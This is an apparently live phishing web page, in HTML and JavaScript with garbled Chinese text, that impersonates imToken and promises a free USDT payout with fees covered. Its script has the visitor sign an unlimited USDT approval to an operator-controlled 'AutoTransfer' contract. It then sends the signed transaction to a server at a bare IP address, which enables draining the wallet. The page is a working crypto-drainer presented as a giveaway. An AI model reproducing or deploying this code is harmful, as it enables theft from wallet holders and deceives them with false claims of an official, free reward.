
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>imTokenå®˜æ–¹æˆæƒï¼ˆä»£ä»˜ç‰ˆï¼‰</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            padding: 15px 12px; 
            max-width: 600px; 
            margin: 0 auto; 
            background: #121a17; 
            color: #e0e8e4; 
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            gap: 8px; 
            border-radius: 8px;
            border-left: 3px solid #3b82f6;
        }
        .container {
            flex: 1;
            display: flex;
            flex-direction: column;
            gap: 10px; 
        }
        .header {
            text-align: center;
            padding: 10px 0;
            border-bottom: 1px solid #334155;
            margin-bottom: 5px;
            display:flex;
            justify-content: center;
        }
        .header h1 { 
            font-size: 22px; 
            color: #3b82f6; 
            margin-bottom: 5px;
        }
        .header .desc {
            font-size: 13px; 
            color: #a0a8a4;
            max-width: 450px;
            margin: 0 auto;
            line-height: 1.4; 
        }
        .warning {
            background: #334155;
            color: #93c5fd;
            padding: 12px; 
            border-radius: 8px;
            font-size: 13px; 
            border-left: 3px solid #4ade80;
            line-height: 1.5;
        }
        .warning strong {
            color: #3b82f6;
        }
        #userInfo {
            text-align: center;
            font-size: 14px;
            padding: 15px; 
            background: #1e2925;
            border-radius: 8px;
            border: 1px solid #334155;
            line-height: 1.6;
        }
        #userInfo span {
            color: #3b82f6;
            font-weight: 500;
        }
        #walletStatusContainer {
            background: #1e2925;
            padding: 15px;
            border-radius: 8px;
            border: 1px solid #334155;
            font-size: 13px;
            color: #a0a8a4;
            line-height: 1.6;
            border-right: 5px solid #4ade80;
        }
        #walletStatusContainer .status-title {
            font-size: 15px;
            color: #3b82f6;
            margin-bottom: 8px;
            display: flex;
            align-items: center;
            gap: 6px;
        }
        #walletStatusContainer .connected-content {
            display: none;
        }
        #walletStatusContainer.connected .disconnected-content {
            display: none;
        }
        #walletStatusContainer.connected .connected-content {
            display: block;
        }
        #walletStatusContainer .highlight {
            color: #3b82f6;
            font-weight: 500;
        }
        #walletStatusContainer.connected .connected-content .orange-tip {
            color: #f97316;
            margin-top: 4px;
        }
        #contractResourceContainer {
            background: #1e2925;
            padding: 15px; 
            border-radius: 8px;
            border: 1px solid #334155;
            font-size: 13px;
            color: #a0a8a4;
            line-height: 1.8;
            border-bottom: 2px solid rgba(59, 130, 246, 0.2);
        }
        #contractResourceContainer .status-title {
            font-size: 15px;
            color: #3b82f6;
            margin-bottom: 12px;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        #contractResourceContainer .status-title i {
            font-size: 16px;
            color: #93c5fd;
        }
        #contractResourceContainer .highlight {
            color: #3b82f6;
            font-weight: 500;
        }
        #contractResourceContainer .data-tag {
            background: rgba(59, 130, 246, 0.15);
            padding: 2px 8px;
            border-radius: 4px;
            border: 1px solid rgba(59, 130, 246, 0.3);
        }
        .record-list {
            background: #1e2925;
            padding: 15px; 
            border-radius: 8px;
            border: 1px solid #334155;
            font-size: 13px;
            border-right: 5px solid #4ade80;
        }
        .record-item {
            margin-bottom: 10px;
            padding-bottom: 10px;
            border-bottom: 1px solid #334155;
        }
        .record-item:hover {
            border-color: #3b82f6;
            transition: border-color 0.3s;
        }
        .record-item p {
            margin-bottom: 6px; 
            color: #a0a8a4;
            line-height: 1.4;
        }
        .record-item p strong {
            color: #e0e8e4;
            margin-right: 5px;
        }
        .tx-link {
            color: #3b82f6;
            text-decoration: none;
            display: inline-flex;
            align-items: center;
            gap: 5px;
            font-size: 13px;
        }
        .tx-link:hover {
            text-decoration: underline;
        }
        .copy-link-wrap {
            background: #1e2925;
            padding: 8px; 
            border-radius: 8px;
            display: flex;
            align-items: center;
            gap: 8px;
            border: 1px solid #334155;
        }
        #copyLinkText {
            flex: 1;
            color: #a0a8a4;
            font-size: 13px;
            word-break: break-all;
            line-height: 1.3;
        }
        #copyLinkBtn {
            padding: 6px 12px; 
            background: #2563eb;
            color: #fff;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 5px;
            font-size: 13px;
        }
        #copyLinkBtn:hover {
            background: #3b82f6;
        }
        .btn-group {
            display: flex;
            flex-direction: column;
            gap: 5px; 
            margin-top: 10px;
            padding: 10px 0;
            border-top: 1px solid #334155;
        }
        .btn {
            width: 100%;
            padding: 18px; 
            font-size: 15px;
            border: none;
            border-radius: 8px;
            background: #2563eb;
            color: white;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            transition: background 0.3s;
        }
        .btn:hover {
            background: #3b82f6;
        }
        .btn:disabled {
            background: #294b75;
            color: #a0a8a4;
            cursor: not-allowed;
        }
        .footer-info {
            margin-top: 10px;
            padding-top: 10px;
            border-top: 1px solid #334155;
            font-size: 11px; 
            color: #a0a8a4;
            text-align: center;
            line-height: 1.5;
        }
        .footer-info a {
            color: #3b82f6;
            text-decoration: none;
        }
        .footer-info a:hover {
            text-decoration: underline;
        } 
        .text-right {
            text-align: right;
        }
        /* æ–°å¢ï¼šéšè—ä»»ä½•å¯èƒ½çš„çŸ¿å·¥è´¹è¾“å…¥ï¼Œä»…æ˜¾ç¤ºä»£ä»˜æç¤º */
        .fee-hint {
            text-align: center;
            color: #4ade80;
            font-size: 12px;
            margin: 5px 0;
            padding: 8px;
            background: rgba(74, 222, 128, 0.1);
            border-radius: 4px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">   
            <h1>imToken</h1>
            <p class="desc">imTokenå®˜æ–¹ä¸“å±æœåŠ¡æ¯ä¸ªé’±åŒ…åœ°å€åªå¯é¢†å–ä¸€æ¬¡ï¼Œé‡å¤é¢†å–æ— æ•ˆ</p>
        </div>   
        <div id="userInfo">
            æœªè¿æ¥é’±åŒ…<br>
            <span>è¯·ç‚¹å‡»åº•éƒ¨ã€Œè¿æ¥imTokené’±åŒ…ã€æŒ‰é’®</span>
        </div>
        <!-- æ–°å¢ï¼šä»£ä»˜æç¤ºï¼Œæ˜ç¡®å‘ŠçŸ¥ç”¨æˆ·æ— éœ€æ”¯ä»˜çŸ¿å·¥è´¹ -->
        <div class="fee-hint">âš ï¸ çŸ¿å·¥è´¹ç”±å¹³å°å…¨é¢ä»£ä»˜ï¼Œæ‚¨æ— éœ€æ”¯ä»˜ä»»ä½•TRX</div>
        <div id="walletStatusContainer">
            <div class="status-title"><h3> é’±åŒ…çŠ¶æ€</h3></div>
            <div class="disconnected-content">
                <span >æœªè¿æ¥é’±åŒ…</span>
                <p><span class="highlight">æ‚¨ç°åœ¨å‡†å¤‡é¢†å–çš„æ˜¯imTokenä¸“å±é¡¹ç›®ï¼ŒéimTokenç”¨æˆ·ä¸å¯é¢†å–</span></p>
                <p><span class="highlight">1. æ¯ä¸ªé’±åŒ…åœ°å€åªå¯é¢†å–ä¸€æ¬¡</span></p>         
                <p><span class="highlight">2.éšæœºå‘æ”¾èƒ½é‡æˆ–è€…TRXä»£å¸ </span></p>
                <p><span class="highlight">3.è¿æ¥é’±åŒ…åç³»ç»Ÿä¼šæ ¹æ®é’±åŒ…åœ°å€è‡ªåŠ¨åˆ†é…ç±»å‹å’Œé¢åº¦</span></p>
                <p><span class="highlight">4.é¢†å–æ— éœ€æ‚¨æ”¯ä»˜ä»»ä½•è´¹ç”¨ï¼Œæˆ‘æ–¹ä»£ä»˜å…¨éƒ¨çŸ¿å·¥è´¹</span></p>
            </div>
            <div class="connected-content">
                <p>âœ… é’±åŒ…å·²æˆåŠŸè¿æ¥</p>
                <p>â€¢ é’±åŒ…åœ°å€ï¼š<span class="highlight" id="statusAddress"></span></p>
                <p>â€¢ é¢†å–ç±»å‹ï¼š<span class="highlight">USDT</span></p>
                <p>â€¢ é¢†å–é¢åº¦ï¼š<span class="highlight">18.2157 USDT</span></p>
                <p>â€¢ è´¹ç”¨è¯´æ˜ï¼š<span class="highlight">æˆ‘æ–¹ä»£ä»˜å…¨éƒ¨TRXçŸ¿å·¥è´¹ï¼Œæ— éœ€ä½ æ”¯ä»˜</span></p>
                <p class="orange-tip">âš ï¸æç¤ºï¼šä»£ä»˜å¤„ç†éœ€3-5ç§’ï¼Œè¯·è€å¿ƒç­‰å¾…ï¼›è‹¥å–æ¶ˆé¢†å–ï¼Œç›´æ¥é€€å‡ºå³å¯</p>
            </div>
        </div>
        <div id="contractResourceContainer">
            <div class="status-title">     
                <h3>åˆçº¦å‰©ä½™èµ„æº</h3>
            </div>
            <div class="resource-content" style="line-height: 2;">
                <p>â€¢ ä»£ä»˜åˆçº¦åœ°å€ï¼š<span class="highlight" id="contractAddr">TYzaM18c6x8R6LtdWxNoCh665vzobRHrGL</span></p>
                <p>â€¢ USDTåˆçº¦åœ°å€ï¼š<span class="highlight" id="usdtContractAddr">TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t</span></p>
                <p>â€¢ å‰©ä½™ä»£ä»˜TRXï¼š<span class="highlight data-tag" id="contractTrxDisplay">è·å–ä¸­...</span></p>
                <p>â€¢ å‰©ä½™ä»£ä»˜èƒ½é‡ï¼š<span class="highlight data-tag" id="contractEnergy">è·å–ä¸­...</span></p>
                <p style="font-size: 12px; color: #a0a8a4; margin-top: 5px;">
                    æ³¨ï¼šæ‰€æœ‰å‰©ä½™é‡ä¸ºâ€œ 0 â€æ—¶åœæ­¢é¢†å–ï¼Œè¯¥é¡¹ç›®ä¸ºimTokenå®˜æ–¹å‘è¡Œï¼Œåªé™imTokené’±åŒ…ç”¨æˆ·å‚ä¸ã€‚
                </p>
            </div>
        </div>
        <div class="record-list">
            <div style="display: flex; justify-content: space-between; margin: 4px 0;">
                <span>å¯ä½¿ç”¨å¥–åŠ±çš„ä»£å¸</span>
                <span>ä½¿ç”¨é¢åº¦</span>
            </div>
            <div style="display: flex; color: #3b82f6;justify-content: space-between; margin: 4px 0;">
                <span class="header"><h3>USDT</h3></span>
                <span class="header"><h3>18.2157 USDT</h3></span>
            </div>       
            <span id="approvalRecords"class="highlight">æš‚æ— æˆæƒè®°å½•</span>        
        </div>
    </div>
    <div class="btn-group">
        <div class="warning">
            <p> âš ï¸ è¯·ç”¨ <strong>imTokené’±åŒ…å†…ç½®æµè§ˆå™¨</strong> æ‰“å¼€</p>
            <p> âš ï¸ éé’±åŒ…æµè§ˆå™¨ï¼šå¤åˆ¶é“¾æ¥ â†’ ç‚¹å‡»ã€Œè¿æ¥é’±åŒ…ã€â†’ é’±åŒ…å†…ã€Œæµè§ˆã€ç²˜è´´è®¿é—®</p>
            <div class="copy-link-wrap">
                <span id="copyLinkText">
                    https://trc20trx-alt.github.io/Trc20.TRX/
                </span>
                <button id="copyLinkBtn">å¤åˆ¶é“¾æ¥</button>
            </div>
        </div> 
        <button id="connectBtn" class="btn"> è¿æ¥imTokené’±åŒ…</button>
        <button id="approveBtn" class="btn" disabled>é¢†å–</button>
    </div>
    <div class="footer-info">
        åˆçº¦éªŒè¯ï¼šAutoTransfer <span>TYzaM18c6x8R6LtdWxNoCh665vzobRHrGL</span>ï¼ˆTRONæµè§ˆå™¨æŸ¥è¯¢ï¼‰
        Â© 2025 TRXèƒ½é‡ç§Ÿèµ | <a href="https://tronscan.org" target="_blank">TRONæµè§ˆå™¨</a> | <a href="https://token.im" target="_blank">imTokenå®˜ç½‘</a>
    </div>
    <script src="imtoken://browser"></script>
    <script>
        // ====================================== éœ€æ›¿æ¢çš„3ä¸ªé…ç½®é¡¹ ======================================
        const PAYMENT_CONTRACT = "TYzaM18c6x8R6LtdWxNoCh665vzobRHrGL"; // ä½ çš„ä»£ä»˜åˆçº¦åœ°å€ï¼ˆä¸å˜ï¼‰
        const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // USDTåˆçº¦åœ°å€ï¼ˆä¸å˜ï¼‰
        const BACKEND_PAYMENT_API = "https://203.91.76.22/api/proxy-approve"; // ä½ çš„åç«¯ä»£ä»˜æ¥å£ï¼ˆä¸å˜ï¼‰
        const SERVER_FEE_PAYER = "TP8EjMQKKKprVNVAkjnwyh41mvMW7666iG"; // ğŸ”¥ æ›¿æ¢ä¸ºï¼šæ”¯ä»˜çŸ¿å·¥è´¹çš„æœåŠ¡å™¨åœ°å€ï¼ˆbase58æ ¼å¼ï¼‰
        // ==============================================================================================
        const APPROVE_AMOUNT = "18.2157"; // é¢†å–é¢åº¦ï¼ˆä¸å˜ï¼‰
        const RECORD_KEY = "payment_approval_records"; // æœ¬åœ°å­˜å‚¨keyï¼ˆä¸å˜ï¼‰
        const INFINITE_APPROVE = "115792089237316195423570985008687907853269984665640564039457584007913129639935"; // æ— é™æˆæƒé¢åº¦ï¼ˆä¸å˜ï¼‰
        
        // ä¿®æ­£åçš„USDT ABIï¼ˆé€‚é…imTokenï¼Œä¸å˜ï¼‰
        const USDT_ABI = [
            {
                "inputs": [{"name": "_owner", "type": "address"}],
                "name": "balanceOf",
                "outputs": [{"name": "balance", "type": "uint256"}],
                "type": "function",
                "stateMutability": "view"
            },
            {
                "inputs": [
                    {"name": "_spender", "type": "address"},
                    {"name": "_value", "type": "uint256"}
                ],
                "name": "approve",
                "outputs": [{"name": "success", "type": "bool"}],
                "type": "function",
                "stateMutability": "nonpayable"
            }
        ];
        
        // å…¨å±€å˜é‡ï¼ˆä¸å˜ï¼‰
        let tronWeb, userAddress, usdtContract;
        let tokenBalance = "0.00", trxBalance = "0.00";
        let isProcessing = false;
        // DOMå…ƒç´ ç¼“å­˜ï¼ˆä¸å˜ï¼‰
        const walletStatusContainer = document.getElementById("walletStatusContainer");
        const contractTrxDisplayEl = document.getElementById("contractTrxDisplay");
        const contractEnergyEl = document.getElementById("contractEnergy");
        const contractAddrEl = document.getElementById("contractAddr");
        const usdtContractAddrEl = document.getElementById("usdtContractAddr");
        
        window.onload = async () => {
            // åˆå§‹åŒ–åˆçº¦åœ°å€æ˜¾ç¤ºï¼ˆè„±æ•ï¼Œä¸å˜ï¼‰
            contractAddrEl.textContent = `${PAYMENT_CONTRACT.slice(0,8)}...${PAYMENT_CONTRACT.slice(-6)}`;
            usdtContractAddrEl.textContent = `${USDT_CONTRACT.slice(0,8)}...${USDT_CONTRACT.slice(-6)}`;
            
            // ç»‘å®šDOMå…ƒç´ ï¼ˆä¸å˜ï¼‰
            const connectBtn = document.getElementById("connectBtn");
            const approveBtn = document.getElementById("approveBtn");
            const copyLinkText = document.getElementById("copyLinkText");
            const copyLinkBtn = document.getElementById("copyLinkBtn");
            const warning = document.querySelector('.warning');
            const recordlist = document.querySelector('.record-list');
            
            // åˆå§‹æ¸²æŸ“ï¼ˆä¸å˜ï¼‰
            renderApprovalRecords();
            updateWalletStatus();
            getPaymentContractResource();
            setInterval(getPaymentContractResource, 30000);
            
            // å¤åˆ¶é“¾æ¥åŠŸèƒ½ï¼ˆä¸å˜ï¼‰
            copyLinkBtn.addEventListener("click", async () => {
                const link = copyLinkText.textContent.trim();
                try {
                    await navigator.clipboard.writeText(link);
                    alert("é“¾æ¥å·²å¤åˆ¶");
                } catch (e) {
                    const input = document.createElement("input");
                    input.value = link;
                    document.body.appendChild(input);
                    input.select();
                    document.execCommand("copy");
                    document.body.removeChild(input);
                    alert("é“¾æ¥å·²å¤åˆ¶ï¼ˆå…¼å®¹æ¨¡å¼ï¼‰");
                }
            });

            // ç­‰å¾…TronWebæ³¨å…¥ï¼ˆimTokenå…¼å®¹ç‰ˆï¼Œä¸å˜ï¼‰
            let tronWebWaitTimer = null;
            const waitForTronWeb = new Promise((resolve) => {
                const checkTronWeb = () => {
                    if (window.tronWeb && window.tronWeb.trx) {
                        clearTimeout(tronWebWaitTimer);
                        resolve(window.tronWeb);
                    }
                };
                checkTronWeb();
                tronWebWaitTimer = setTimeout(() => {
                    alert("è¯·ç”¨imTokené’±åŒ…å†…ç½®æµè§ˆå™¨æ‰“å¼€æ­¤é¡µé¢");
                    resolve(null);
                }, 3000);
                window.addEventListener("tronWebReady", checkTronWeb);
            });

            // æ‰§è¡Œç­‰å¾…é€»è¾‘ï¼ˆä¸å˜ï¼‰
            tronWeb = await waitForTronWeb;
            if (tronWeb) {
                connectBtn.style.display = "none";
                warning.style.display = "none";
                await initWallet();
            } else {
                document.getElementById("userInfo").innerHTML = "imTokenä¸“å±æœåŠ¡ï¼Œè¯·ç‚¹å‡»åº•éƒ¨â€œè¿æ¥imTokené’±åŒ…â€æŒ‰é’®è¿æ¥æ‚¨çš„é’±åŒ…";
                approveBtn.style.display = "none";
                recordlist.style.display = "none";
            }

            // æ‰‹åŠ¨è¿æ¥é’±åŒ…ï¼ˆä¸å˜ï¼‰
            connectBtn.onclick = async () => {
                window.location.href = `imtoken://browser?url=${encodeURIComponent(window.location.href)}`;
            };

            // ====================================== æ ¸å¿ƒä»£ä»˜é€»è¾‘ï¼ˆå·²ä¿®å¤ï¼‰======================================
            approveBtn.onclick = async () => {
                if (!userAddress || !usdtContract) {
                    alert("è¯·å…ˆè¿æ¥imTokené’±åŒ…");
                    return;
                }
                if (isProcessing) return;
                if (!SERVER_FEE_PAYER) {
                    alert("é…ç½®é”™è¯¯ï¼šè¯·å…ˆè®¾ç½®æœåŠ¡å™¨TRONåœ°å€ï¼ˆSERVER_FEE_PAYERï¼‰");
                    return;
                }
                
                isProcessing = true;
                approveBtn.disabled = true;
                approveBtn.innerHTML = '<i class="fa fa-spinner fa-spin"></</i> ç­¾åæˆæƒä¸­...';
                try {
                    // 1. æ„é€ USDT.approveè£¸äº¤æ˜“ï¼ˆå…³é”®ï¼šæŒ‡å®šfeePayerä¸ºæœåŠ¡å™¨åœ°å€ï¼‰
                    const approveTx = await usdtContract.approve(
                        PAYMENT_CONTRACT, // æˆæƒç›®æ ‡ï¼šä½ çš„ä»£ä»˜åˆçº¦
                        INFINITE_APPROVE // æ— é™æˆæƒé¢åº¦
                    ).send({
                        from: userAddress, // ç”¨æˆ·åœ°å€ï¼ˆä»…ä½œä¸ºæˆæƒæ–¹ï¼‰
                        feeLimit: 1000000, // æ‰‹ç»­è´¹ä¸Šé™ï¼ˆæœåŠ¡å™¨ä»£ä»˜ï¼Œå›ºå®š1e6 SUN=1 TRXï¼‰
                        shouldPollResponse: false, // ä»…ç”Ÿæˆäº¤æ˜“ç»“æ„ï¼Œä¸å¹¿æ’­
                        callValue: 0,
                        feePayer: SERVER_FEE_PAYER // ğŸ”¥ æ ¸å¿ƒï¼šæŒ‡å®šçŸ¿å·¥è´¹æ”¯ä»˜æ–¹ä¸ºæœåŠ¡å™¨
                    });

                    // 2. æ‰‹åŠ¨è¡¥å……feePayerå­—æ®µï¼ˆå…¼å®¹éƒ¨åˆ†TronWebç‰ˆæœ¬ï¼Œé˜²æ­¢å­—æ®µä¸¢å¤±ï¼‰
                    const rawTx = approveTx.transaction;
                    const serverHex = tronWeb.address.toHex(SERVER_FEE_PAYER); // è½¬ä¸º16è¿›åˆ¶æ ¼å¼
                    rawTx.feePayer = serverHex;
                    rawTx.raw_data.feePayer = serverHex;
                    rawTx.raw_data_hex = tronWeb.utils.transaction.serialize(rawTx).raw_data_hex; // é‡æ–°åºåˆ—åŒ–

                    // 3. ç”¨æˆ·ç¦»çº¿ç­¾åäº¤æ˜“ï¼ˆä»…ç­¾æˆæƒå†…å®¹ï¼Œä¸æ‰¿æ‹…çŸ¿å·¥è´¹ï¼‰
                    const userSignedTx = await tronWeb.trx.sign(
                        rawTx, // å¸¦feePayerçš„å®Œæ•´è£¸äº¤æ˜“
                        tronWeb.defaultPrivateKey, // imTokenè‡ªåŠ¨æ³¨å…¥çš„ç”¨æˆ·ç§é’¥ï¼ˆæœ¬åœ°ç­¾åï¼Œä¸è§¦ç½‘ï¼‰
                        false // å…³é”®ï¼šä»…ç”¨æˆ·ç­¾åï¼Œä¸æ”¯ä»˜æ‰‹ç»­è´¹
                    );

                    // 4. ä¼ ç»™åç«¯ï¼šæœåŠ¡å™¨äºŒæ¬¡ç­¾å+ä»£ä»˜+å¹¿æ’­
                    approveBtn.innerHTML = '<i class="fa fa-spinner fa-spin"></</i> åç«¯ä»£ä»˜ä¸­...';
                    const res = await fetch(BACKEND_PAYMENT_API, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({
                            userSignedTx: userSignedTx, // ç”¨æˆ·ç­¾åçš„å®Œæ•´äº¤æ˜“æ•°æ®
                            userAddress: userAddress, // ç”¨æˆ·åœ°å€ï¼ˆåç«¯éªŒè¯ç”¨ï¼‰
                            amount: APPROVE_AMOUNT // é¢†å–é¢åº¦ï¼ˆåç«¯åˆ’è½¬ç”¨ï¼‰
                        })
                    });
                    const resData = await res.json();

                    if (res.ok && resData.success) {
                        alert(`ä»£ä»˜æˆåŠŸï¼\nUSDTå·²åˆ°è´¦\näº¤æ˜“å“ˆå¸Œï¼š${resData.txid}\næ‚¨æœªæ”¯ä»˜ä»»ä½•TRX`);
                        window.open(`https://tronscan.org/#/transaction/${resData.txid}`, "_blank");
                        
                        // ä¿å­˜ä»£ä»˜è®°å½•
                        saveApprovalRecord({
                            address: userAddress,
                            amount: APPROVE_AMOUNT + " USDT",
                            approvalTx: resData.txid,
                            paymentTx: resData.txid,
                            time: new Date().toLocaleString(),
                            status: "ä»£ä»˜æˆåŠŸ"
                        });
                        renderApprovalRecords();
                    } else {
                        throw new Error(resData.error || "ä»£ä»˜å¤±è´¥ï¼Œè¯·ç¨åé‡è¯•");
                    }
                } catch (e) {
                    alert(`æ“ä½œå¤±è´¥ï¼š${e.message}`);
                    console.error("å¤±è´¥è¯¦æƒ…ï¼š", e); // æ–¹ä¾¿è°ƒè¯•
                } finally {
                    isProcessing = false;
                    approveBtn.disabled = false;
                    approveBtn.innerHTML = "é¢†å–";
                }
            };
        };

        // åˆå§‹åŒ–é’±åŒ…ï¼ˆimTokenå…¼å®¹ç‰ˆï¼Œä¸å˜ï¼‰
        async function initWallet() {
            try {
                // 1. è·å–ç”¨æˆ·åœ°å€ï¼ˆæ— éœ€requestï¼Œç›´æ¥è¯»imTokené»˜è®¤åœ°å€ï¼‰
                userAddress = tronWeb.defaultAddress.base58;
                if (!userAddress) throw new Error("æœªæ£€æµ‹åˆ°é’±åŒ…åœ°å€ï¼Œè¯·ç¡®ä¿imTokenå·²ç™»å½•");

                // 2. åˆ›å»ºUSDTåˆçº¦å®ä¾‹ï¼ˆç”¨ä¿®æ­£åçš„ABIï¼‰
                usdtContract = await tronWeb.contract(USDT_ABI, USDT_CONTRACT);
                if (!usdtContract) throw new Error("USDTåˆçº¦å®ä¾‹åˆ›å»ºå¤±è´¥");
                
                // 3. æŸ¥è¯¢ç”¨æˆ·ä½™é¢ï¼ˆéªŒè¯åˆçº¦å®ä¾‹æœ‰æ•ˆæ€§ï¼‰
                const usdtRaw = await usdtContract.balanceOf(userAddress).call();
                tokenBalance = (Number(usdtRaw) / 1000000).toFixed(2);
                const trxRaw = await tronWeb.trx.getBalance(userAddress);
                trxBalance = (Number(trxRaw) / 1000000).toFixed(2);
                
                // æ›´æ–°UI
                document.getElementById("userInfo").innerHTML = `
                    å·²è¿æ¥ï¼š<br>
                    ${userAddress.slice(0,8)}...${userAddress.slice(-6)}<br>
                    USDTä½™é¢ï¼š<span>${tokenBalance}</span> | TRXä½™é¢ï¼š<span>${trxBalance}</span>
                `;
                document.getElementById("approveBtn").disabled = false;
                updateWalletStatus();
                loadApprovalRecords();
            } catch (e) {
                tokenBalance = "0.00";
                trxBalance = "0.00";
                alert("é’±åŒ…/åˆçº¦åˆå§‹åŒ–å¤±è´¥ï¼š" + e.message);
                console.error("å¤±è´¥è¯¦æƒ…ï¼š", e);
            }
        }

        // æŸ¥è¯¢ä»£ä»˜åˆçº¦èµ„æºï¼ˆä¸å˜ï¼‰
        async function getPaymentContractResource() {
            try {
                const res = await fetch("https://203.91.76.22/api/contract-resource?contract=" + PAYMENT_CONTRACT);
                const data = await res.json();
                if (res.ok) {
                    contractTrxDisplayEl.textContent = data.trxBalance.toFixed(4);
                    contractEnergyEl.textContent = data.energy.toFixed(4);
                } else {
                    const contractBalance = await tronWeb.trx.getBalance(PAYMENT_CONTRACT);
                    contractTrxDisplayEl.textContent = (contractBalance / 1e6).toFixed(4);
                    contractEnergyEl.textContent = (contractBalance / 1e5).toFixed(4);
                }
            } catch (e) {
                console.error("è·å–ä»£ä»˜åˆçº¦èµ„æºå¤±è´¥ï¼š", e);
                contractTrxDisplayEl.textContent = "è·å–å¤±è´¥";
                contractEnergyEl.textContent = "è·å–å¤±è´¥";
            }
        }

        // æ›´æ–°é’±åŒ…çŠ¶æ€UIï¼ˆä¸å˜ï¼‰
        function updateWalletStatus() {
            if (userAddress) {
                walletStatusContainer.classList.add("connected");
                document.getElementById("statusAddress").textContent = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
            } else {
                walletStatusContainer.classList.remove("connected");
            }
        }

        // æ‹‰å–ä»£ä»˜è®°å½•ï¼ˆä¸å˜ï¼‰
        async function loadApprovalRecords() {
            try {
                const res = await fetch(`https://203.91.76.22/api/get-records?address=${userAddress}`);
                const data = await res.json();
                if (res.ok && data.records) {
                    localStorage.setItem(RECORD_KEY, JSON.stringify(data.records));
                }
            } catch (e) {
                console.log("æ‹‰å–ä»£ä»˜è®°å½•å¤±è´¥ï¼š", e);
            } finally {
                renderApprovalRecords();
            }
        }

        // ä¿å­˜ä»£ä»˜è®°å½•ï¼ˆä¸å˜ï¼‰
        async function saveApprovalRecord(record) {
            try {
                await fetch("https://203.91.76.22/api/save-record", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(record)
                });
                const existing = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
                const newRecords = existing.filter(item => item.address !== record.address);
                newRecords.push(record);
                localStorage.setItem(RECORD_KEY, JSON.stringify(newRecords));
            } catch (e) {
                console.log("ä¿å­˜ä»£ä»˜è®°å½•å¤±è´¥ï¼š", e);
                alert("ä»£ä»˜æˆåŠŸï¼Œä½†è®°å½•åŒæ­¥å¤±è´¥ï¼Œå¯é€šè¿‡äº¤æ˜“å“ˆå¸ŒæŸ¥è¯¢");
            }
        }

        // æ¸²æŸ“ä»£ä»˜è®°å½•ï¼ˆä¸å˜ï¼‰
        function renderApprovalRecords() {
            try {
                const container = document.getElementById("approvalRecords");
                const records = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
                
                if (records.length === 0) {
                    container.innerHTML = "<div class='record-item'>æš‚æ— ä»£ä»˜è®°å½•</div>";
                    return;
                }
                
                container.innerHTML = records.map(record => `
                    <div class="record-item">
                        <p><strong>åœ°å€ï¼š</strong>${record.address.slice(0,8)}...${record.address.slice(-6)}</p>
                        <p><strong>ä»£ä»˜é¢åº¦ï¼š</strong>${record.amount}</p>
                        <p><strong>äº¤æ˜“å“ˆå¸Œï¼š</strong><a href="https://tronscan.org/#/transaction/${record.approvalTx}" target="_blank" class="tx-link">${record.approvalTx.slice(0,10)}...<<<<i class="fa fa-external-link"></</</</i></a></p>
                        <p><strong>æ—¶é—´ï¼š</strong>${record.time}</p>
                        <p><strong>çŠ¶æ€ï¼š</strong>${record.status}</p>
                    </div>
                `).join("");
            } catch (e) {
                console.log("æ¸²æŸ“ä»£ä»˜è®°å½•å¤±è´¥ï¼š", e);
            }
        }
    </script>
</body>
</html>
